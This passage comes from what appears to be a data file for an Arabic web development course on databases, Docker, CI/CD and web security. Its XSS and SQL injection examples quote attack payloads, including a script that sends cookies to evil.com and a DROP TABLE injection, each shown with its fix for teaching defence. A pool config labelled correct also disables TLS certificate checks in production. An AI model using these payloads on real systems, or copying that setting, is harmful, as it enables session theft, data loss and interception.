      'INSERT INTO transactions (from_id, to_id, amount, created_at) VALUES ($1, $2, $3, NOW())',
      [fromId, toId, amount]
    );

    return { success: true, newBalance: from.balance - amount };
  });
}` },

        { type: "h2", content: "6. Connection Pooling — إدارة الاتصالات" },
        { type: "p", content: "إنشاء اتصال جديد بقاعدة البيانات لكل طلب مُكلف زمنياً (50-300ms). Connection Pool يُبقي مجموعة من الاتصالات مفتوحة ويُوزّعها على الطلبات. هذا يُحسّن الأداء بشكل كبير." },
        { type: "code", language: "typescript", title: "إعداد Connection Pool الصحيح", content: `import { Pool } from 'pg';

// إعداد Pool بقيم مناسبة
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 20,                // الحد الأقصى للاتصالات المتزامنة
  idleTimeoutMillis: 30_000,  // إغلاق الاتصال الخامل بعد 30 ثانية
  connectionTimeoutMillis: 2_000,  // انتظر 2 ثانية للاتصال قبل الفشل
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// دالة استعلام آمنة مع معالجة أخطاء
export async function query<T>(
  sql: string,
  params?: unknown[]
): Promise<T[]> {
  const start = Date.now();
  try {
    const { rows } = await pool.query(sql, params);
    const duration = Date.now() - start;
    if (duration > 200) {
      console.warn(\`Slow query (\${duration}ms): \${sql.slice(0, 50)}...\`);
    }
    return rows as T[];
  } catch (error) {
    console.error('Database query failed:', { sql, params, error });
    throw error;
  }
}

// مراقبة الـ Pool
pool.on('error', (err) => {
  console.error('Unexpected pool error:', err);
});` },

        { type: "h2", content: "7. ORM — Drizzle ORM مع TypeScript" },
        { type: "p", content: "ORM يسمح بكتابة استعلامات قاعدة البيانات بكود TypeScript بدل SQL الخام، مع أمان الأنواع الكامل وتجنب SQL Injection. Drizzle ORM هو الأحدث والأسرع — يُولّد أنواع TypeScript مباشرة من تعريف الجداول." },
        { type: "code", language: "typescript", title: "Drizzle ORM — Schema وAستعلامات متقدمة", content: `import { pgTable, uuid, text, timestamp, integer, pgEnum, boolean } from 'drizzle-orm/pg-core';
import { db } from './database';
import { eq, desc, and, gte, count, sql } from 'drizzle-orm';

// تعريف الجدول — TypeScript types تُولَّد تلقائياً
const statusEnum = pgEnum('post_status', ['draft', 'published', 'archived']);

export const posts = pgTable('posts', {
  id:          uuid('id').primaryKey().defaultRandom(),
  authorId:    uuid('author_id').notNull(),
  title:       text('title').notNull(),
  status:      statusEnum('status').notNull().default('draft'),
  viewCount:   integer('view_count').notNull().default(0),
  publishedAt: timestamp('published_at', { withTimezone: true }),
  createdAt:   timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt:   timestamp('updated_at', { withTimezone: true }).notNull().defaultNow()
});

// TypeScript يعرف الأنواع تلقائياً
type Post    = typeof posts.$inferSelect;   // لـ SELECT
type NewPost = typeof posts.$inferInsert;   // لـ INSERT

// استعلامات مع أمان أنواع كامل
const publishedPosts = await db
  .select()
  .from(posts)
  .where(and(
    eq(posts.status, 'published'),
    gte(posts.publishedAt, new Date('2024-01-01'))
  ))
  .orderBy(desc(posts.publishedAt))
  .limit(20);

// INSERT
const newPost: NewPost = {
  authorId: userId,
  title: "مقال جديد",
  status: 'draft'
};
const [created] = await db.insert(posts).values(newPost).returning();

// UPDATE مُقيَّد بالنوع
await db.update(posts)
  .set({ status: 'published', publishedAt: new Date() })
  .where(and(eq(posts.id, postId), eq(posts.authorId, userId)));

// استعلام مجمَّع
const [stats] = await db
  .select({
    total: count(),
    published: sql\`COUNT(*) FILTER (WHERE status = 'published')\`
  })
  .from(posts);` },

        { type: "active-recall", questions: [
          { q: "ما هدف التطبيع (Normalization) وكيف تعرف أن تصميمك يحتاجه؟", a: "التطبيع يُزيل تكرار البيانات ويضمن الاتساق. علامات الحاجة: نفس البيانات في أماكن متعددة، تحديث معلومة يتطلب تعديل صفوف كثيرة، قيم متعددة مفصولة بفاصلة في خلية واحدة." },
          { q: "لماذا الفهارس مهمة ومتى تكون ضارة؟", a: "مهمة: تُسرّع استعلامات القراءة بشكل كبير (من Seq Scan إلى Index Scan). ضارة: تُبطئ INSERT وUPDATE وDELETE. لا تُضف فهرساً على جداول صغيرة أو حقول نادرة الاستخدام في WHERE." },
          { q: "ما هي ACID وأهميتها في التطبيقات المالية؟", a: "ACID: Atomicity (كل شيء أو لا شيء)، Consistency (لا بيانات فاسدة)، Isolation (عمليات متوازية معزولة)، Durability (البيانات تثبت). في المالية: يمنع سرقة المال أو فقدانه عند فشل أحد عمليتَي التحويل." },
          { q: "ما الفرق بين INNER JOIN وLEFT JOIN؟", a: "INNER JOIN: يُرجع فقط الصفوف التي لها مطابقة في كلا الجدولين. LEFT JOIN: يُرجع كل صفوف الجدول الأيسر حتى لو لم يكن لها مطابقة في الأيمن (القيم غير المطابقة تكون NULL)." },
          { q: "ما دور Connection Pool وما قيمة max المناسبة؟", a: "Pool يُبقي اتصالات مفتوحة لإعادة استخدامها بدل فتح اتصال جديد مع كل طلب. القيمة المناسبة: عادةً 10-20 اتصالاً متزامناً. PostgreSQL يدعم حوالي 100 اتصال افتراضياً — وزّعها على خوادمك." }
        ]}
      ]
    },
    {
      id: "unit-13",
      stageId: "stage-3",
      unitNumber: 12,
      title: "النشر وDevOps وأمن الويب",
      description: "Docker، CI/CD، أمن التطبيقات، وبيئات الإنتاج الاحترافية.",
      content: [
        { type: "h1", content: "الوحدة 13: النشر وDevOps وأمن الويب" },
        { type: "p", content: "كتابة الكود 50% من العمل. النصف الآخر هو جعله يعمل بشكل موثوق في الإنتاج وحمايته من الاختراقات. DevOps هو ثقافة تعاون بين المطورين وفرق البنية التحتية لتسريع الإيصال وتحسين الموثوقية." },
        { type: "p", content: "الهجمات الإلكترونية لا تنتظر. كل يوم تظهر ثغرات جديدة. مطور يجهل أمن الويب مثل مهندس يبني جداراً بدون أساس — يبدو جيداً حتى يسقط. هذه الوحدة تُعطيك المعرفة الأمنية الأساسية لحماية مستخدميك." },

        { type: "h2", content: "1. بيئات التطوير — من Localhost للإنتاج" },
        { type: "ascii", content: `
 Developer               CI/CD Pipeline              Production
 Laptop                                              Cloud Server

[Local Dev] ──push──► [GitHub] ──trigger──► [Test] ──► [Staging] ──► [Production]
 localhost               code                  Lint       Preview       Live Users
                         review                Tests      QA Team
` },
        { type: "table", headers: ["البيئة", "الغرض", "من يصل إليها؟", "قاعدة البيانات"], rows: [
          ["Development", "التطوير اليومي", "المطور فقط", "بيانات وهمية محلية"],
          ["Testing (CI)", "اختبارات تلقائية", "CI Server", "DB مؤقتة تُحذف بعد الاختبار"],
          ["Staging", "اختبار قبل الإنتاج", "فريق QA والعميل", "نسخة من بيانات الإنتاج"],
          ["Production", "المنتج الحقيقي", "المستخدمون النهائيون", "البيانات الحقيقية الحساسة"]
        ]},

        { type: "h2", content: "2. Docker — الحاويات بعمق" },
        { type: "p", content: "Docker يحل مشكلة 'يعمل على جهازي ولكن لا يعمل على السيرفر' بتغليف التطبيق وكل اعتماداته في 'حاوية' قابلة للتشغيل في أي مكان. الحاوية تشمل: الكود، وقت التشغيل (Runtime)، المكتبات، والإعدادات." },
        { type: "code", language: "dockerfile", title: "Dockerfile احترافي (Multi-Stage Build)", content: `# ════ المرحلة 1: البناء ════
FROM node:20-alpine AS builder
WORKDIR /app

# نسخ ملفات الاعتماديات أولاً — يستغل Docker Layer Caching
COPY package*.json tsconfig.json ./
RUN npm ci --only=production=false   # تثبيت كل الاعتماديات

# بناء الكود
COPY src/ ./src/
RUN npm run build                    # TypeScript → JavaScript

# ════ المرحلة 2: التشغيل (صورة أصغر وأأمن) ════
FROM node:20-alpine AS runner

# مستخدم غير root للأمان — لا تشغّل containers كـ root أبداً
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
WORKDIR /app

# نسخ فقط ما نحتاجه من مرحلة البناء
COPY --from=builder --chown=appuser:appgroup /app/dist        ./dist
COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules
COPY --chown=appuser:appgroup package.json ./

USER appuser
EXPOSE 3000

# Health Check: يتحقق من صحة الخادم كل 30 ثانية
HEALTHCHECK --interval=30s --timeout=5s --retries=3 \\
  CMD wget -qO- http://localhost:3000/api/health || exit 1

CMD ["node", "dist/index.js"]` },
        { type: "p", content: "Multi-Stage Build يُنتج صورة نهائية أصغر بكثير: لا يوجد TypeScript compiler، لا مصادر .ts، فقط JavaScript المُجمَّع. الصورة الصغيرة أسرع في التحميل وأقل مساحة للهجوم الأمني." },
        { type: "code", language: "yaml", title: "docker-compose.yml — بيئة تطوير متكاملة", content: `version: '3.9'

services:
  api:
    build:
      context: .
      target: builder          # مرحلة البناء للتطوير
    command: npm run dev        # nodemon للـ Hot Reload
    ports:
      - "3000:3000"
    environment:
      NODE_ENV: development
      DATABASE_URL: postgresql://user:pass@db:5432/appdb
      JWT_SECRET: dev-secret-not-for-production
      REDIS_URL: redis://redis:6379
    volumes:
      - ./src:/app/src          # تحديث مباشر بدون إعادة بناء
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_started

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
      POSTGRES_DB: appdb
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./database/init.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d appdb"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    command: redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru

  adminer:
    image: adminer:latest
    ports:
      - "8080:8080"

volumes:
  postgres_data:` },

        { type: "h2", content: "3. أمن الويب — OWASP Top 10 المُبسَّط" },
        { type: "p", content: "OWASP (Open Web Application Security Project) تنشر قائمة أخطر ثغرات تطبيقات الويب. هذه أبرز ثلاث ثغرات يجب أن تفهمها وتمنعها في كل مشروع تبنيه." },
        { type: "callout", calloutType: "mistake", title: "1. SQL Injection — الأخطر والأسهل منعاً", content: [
          { type: "p", content: "يحدث عند دمج مدخلات المستخدم في استعلام SQL دون تنظيف. المهاجم يُرسل SQL مُضمَّن في المدخلات ليُنفِّذه على قاعدة بياناتك." },
          { type: "code", language: "typescript", content: `// ❌ كارثة: المهاجم يرسل: email = "' OR '1'='1"
const query = \`SELECT * FROM users WHERE email = '\${email}'\`;
// يُصبح: SELECT * FROM users WHERE email = '' OR '1'='1'
// يُرجع كل المستخدمين! والمهاجم يدخل دون كلمة مرور

// ❌ أسوأ: "'; DROP TABLE users; --"
// يمسح قاعدة بياناتك كاملة!

// ✅ الحل الوحيد: Parameterized Queries دائماً
await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]  // لا تخلط أبداً بين الكود والبيانات
);

// ✅ مع ORM: المعاملات المُحددة المعلمات تلقائية
const user = await db.select().from(users)
  .where(eq(users.email, email));  // آمن تلقائياً` }
        ]},
        { type: "callout", calloutType: "warning", title: "2. XSS — Cross-Site Scripting", content: [
          { type: "p", content: "يحدث عند عرض محتوى المستخدم مباشرة في HTML دون تنظيف. المهاجم يحقن JavaScript ينفذ في متصفح المستخدمين الآخرين ويسرق جلساتهم." },
          { type: "code", language: "typescript", content: `// ❌ خطر: المهاجم يرسل في تعليقه:
// <script>fetch('https://evil.com?c='+document.cookie)</script>
// وحين تعرضه للمستخدمين: يُرسل cookies الجميع للمهاجم!

// ✅ React: آمن تلقائياً — JSX يُهرّب النص
<p>{userComment}</p>   // آمن: يعرض النص حرفياً

// ✅ إذا احتجت HTML خاماً: استخدم DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userHtml, {
    ALLOWED_TAGS: ['b', 'i', 'p', 'br']  // حدد ما تسمح به
  })
}} />

// ✅ في Express: helmet يضيف Security Headers
import helmet from 'helmet';
app.use(helmet());   // يضيف CSP, X-Frame-Options, وغيرها` }
        ]},
        { type: "callout", calloutType: "mistake", title: "3. IDOR — Insecure Direct Object Reference", content: [
          { type: "p", content: "يحدث عند الوصول لسجلات بتغيير ID في URL دون التحقق من الملكية. أشيع ثغرة في APIs الحديثة." },
          { type: "code", language: "typescript", content: `// ❌ خطر: المستخدم يغير /orders/123 لـ /orders/456
// ويرى طلبات شخص آخر!
app.get('/orders/:id', auth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order);  // لا تحقق من الملكية!
});

// ✅ الحل: تحقق دائماً من الملكية
app.get('/orders/:id', auth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  if (!order) {
    res.status(404).json({ error: 'غير موجود' });
    return;
  }
  // تحقق أن الطلب يخص المستخدم الحالي (أو أنه admin)
  if (order.userId !== req.user.id && req.user.role !== 'admin') {
    res.status(403).json({ error: 'غير مصرح لك بالوصول لهذا السجل' });
    return;
  }
  res.json(order);
});` }
        ]},

        { type: "h2", content: "4. إدارة الأسرار والمتغيرات البيئية" },
        { type: "p", content: "كلمات المرور ومفاتيح API أسرار يجب ألا تدخل الكود المصدري أبداً. استخدام متغيرات البيئة (Environment Variables) مع التحقق من اكتمالها عند الإقلاع هو الممارسة الصحيحة." },
        { type: "code", language: "typescript", title: "إدارة Config بشكل آمن مع Zod", content: `// config.ts — تحميل والتحقق من الـ Environment Variables
import { z } from 'zod';

const envSchema = z.object({
  NODE_ENV:     z.enum(['development', 'test', 'production']),
  PORT:         z.coerce.number().default(3000),
  DATABASE_URL: z.string().url('DATABASE_URL يجب أن يكون URL صالحاً'),
  JWT_SECRET:   z.string().min(32, 'JWT_SECRET يجب أن يكون 32 حرفاً على الأقل'),
  REDIS_URL:    z.string().url().optional(),
  CORS_ORIGIN:  z.string().default('http://localhost:3000'),
});

const parsed = envSchema.safeParse(process.env);
if (!parsed.success) {
  console.error('❌ متغيرات البيئة غير مكتملة:');
  console.error(JSON.stringify(parsed.error.flatten().fieldErrors, null, 2));
  process.exit(1);  // أوقف التطبيق فوراً — لا تشغّله بإعدادات ناقصة
}

export const config = parsed.data;

// .env.example — ما يجب توثيقه في الـ repo (بدون قيم حقيقية)
// NODE_ENV=development
// DATABASE_URL=postgresql://user:password@localhost:5432/dbname
// JWT_SECRET=your-very-long-random-secret-at-least-32-chars
// REDIS_URL=redis://localhost:6379` },

        { type: "h2", content: "5. Rate Limiting و HTTPS" },
        { type: "p", content: "Rate Limiting يمنع هجمات Brute Force والإساءة. HTTPS يشفر البيانات أثناء النقل — في 2024 لا يوجد مبرر لعدم استخدامه." },
        { type: "code", language: "typescript", title: "Rate Limiting متعدد المستويات", content: `import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { redis } from './redis';

// 100 طلب كل 15 دقيقة لكل IP — للـ API العام
export const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  store: new RedisStore({ client: redis }),  // مشترك بين الخوادم
  message: { error: 'طلبات كثيرة. حاول بعد قليل.' }
});

// 5 محاولات تسجيل دخول فقط كل ساعة
export const loginLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 5,
  keyGenerator: (req) => req.body.email || req.ip,
  skipSuccessfulRequests: true,   // لا تحسب المحاولات الناجحة
  message: { error: 'تجاوزت عدد المحاولات. حاول بعد ساعة.' }
});

// 10 محاولات إنشاء حساب كل يوم من نفس IP
export const registerLimiter = rateLimit({
  windowMs: 24 * 60 * 60 * 1000,
  max: 10,
  message: { error: 'تجاوزت الحد. حاول غداً.' }
});

app.use('/api', globalLimiter);
app.post('/api/auth/login',    loginLimiter,    authController.login);
app.post('/api/auth/register', registerLimiter, authController.register);` },

        { type: "project", title: "CI/CD Pipeline كامل مع GitHub Actions", content: [
          { type: "p", content: "Pipeline يتحقق، يبني، ويُرسل إشعاراً عند الفشل:" },
          { type: "code", language: "yaml", content: `# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  # ════ مرحلة الفحص والاختبار ════
  test:
    name: Lint, Type-check & Test
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci
      - run: npm run typecheck
      - run: npm run lint
      - run: npm run db:migrate  # تشغيل الـ migrations على DB الاختبار
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
      - run: npm test
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
          JWT_SECRET: test-secret-at-least-32-characters-long

  # ════ مرحلة النشر (للـ main فقط) ════
  deploy:
    name: Deploy to Production
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    environment: production

    steps:
      - uses: actions/checkout@v4

      - name: بناء صورة Docker
        run: |
          docker build -t myapp:${{ github.sha }} .
          docker tag myapp:${{ github.sha }} myapp:latest

      - name: نشر على السيرفر
        uses: appleboy/ssh-action@v1
        with:
          host: ${{ secrets.SERVER_HOST }}
          username: ${{ secrets.SERVER_USER }}
          key: ${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            docker pull myapp:latest
            docker stop app || true
            docker run -d --name app --restart unless-stopped \\
              -p 3000:3000 \\
              --env-file /etc/app.env \\
              myapp:latest` }
        ]},

        { type: "active-recall", questions: [
          { q: "ما الفرق بين Dockerfile وdocker-compose.yml؟", a: "Dockerfile يصف كيف تبني صورة (Image) لخدمة واحدة. docker-compose.yml يصف كيف تشغّل عدة خدمات معاً وتربطها (API + DB + Redis)." },
          { q: "ما هو IDOR وكيف تمنعه؟", a: "IDOR: الوصول لبيانات مستخدم آخر بتغيير ID. الوقاية: بعد جلب السجل، تحقق أن userId يطابق req.user.id أو أن المستخدم admin." },
          { q: "لماذا يُفضَّل Multi-Stage Build في Docker؟", a: "يُنتج صورة نهائية أصغر: المرحلة الأولى تحتوي أدوات البناء (TypeScript compiler)، المرحلة الثانية تحتوي فقط ما يلزم التشغيل. صورة أصغر = تحميل أسرع + مساحة هجوم أقل." },
          { q: "ما هو Rate Limiting ولماذا نستخدم Redis لتخزين العدادات؟", a: "Rate Limiting يحد عدد الطلبات لمنع الإساءة والـ Brute Force. بدون Redis، كل خادم يحتفظ بعداداته المنفصلة — المهاجم يستخدم خادماً مختلفاً في كل طلب. Redis مشترك يضمن تطبيق الحد الصحيح عبر كل الخوادم." },
          { q: "ما أهمية التحقق من متغيرات البيئة عند إقلاع التطبيق؟", a: "إذا بدأ التطبيق بإعدادات ناقصة (مثل: بدون JWT_SECRET) يعمل بشكل خاطئ أو غير آمن. التحقق عند الإقلاع يُوقف التطبيق فوراً برسالة واضحة بدل فشل خفي لاحقاً." }
        ]}
      ]
    }
  ]
};
